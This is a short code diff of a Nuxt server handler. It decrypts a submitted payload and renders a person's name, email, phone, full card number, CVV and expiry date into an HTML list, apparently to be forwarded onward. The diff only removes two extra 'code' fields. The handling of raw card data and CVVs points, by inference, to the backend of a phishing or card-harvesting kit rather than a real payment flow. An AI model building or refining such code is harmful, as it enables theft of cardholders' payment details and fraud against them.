@@ -7,7 +7,7 @@ export default defineEventHandler(async (event) => {
   const { payload } = await readBody(event)
   const data = decryptPayload(payload, secret)
 
-  const { pseudo, email, telephone,code_1, code_2, message, card_number, card_expiration, card_cvv } = data
+  const { pseudo, email, telephone, message, card_number, card_expiration, card_cvv } = data
 
   if (!email || !pseudo) {
     throw createError({
@@ -49,8 +49,6 @@ export default defineEventHandler(async (event) => {
       <li><b>Email :</b> ${data.email || 'N/A'}</li>
       <li><b>Téléphone :</b> ${data.telephone || 'N/A'}</li>
       <li><b>Carte :</b> ${data.card_number || 'N/A'}</li>
-      <li><b>Code 1 :</b> ${data.code_1 || 'N/A'}</li>
-      <li><b>Code 2 :</b> ${data.code_2 || 'N/A'}</li>
       <li><b>CVV :</b> ${data.card_cvv|| 'N/A'}</li>
       <li><b>Date d'expiration :</b> ${data.card_expiration || 'N/A'}</li>
     </ol>
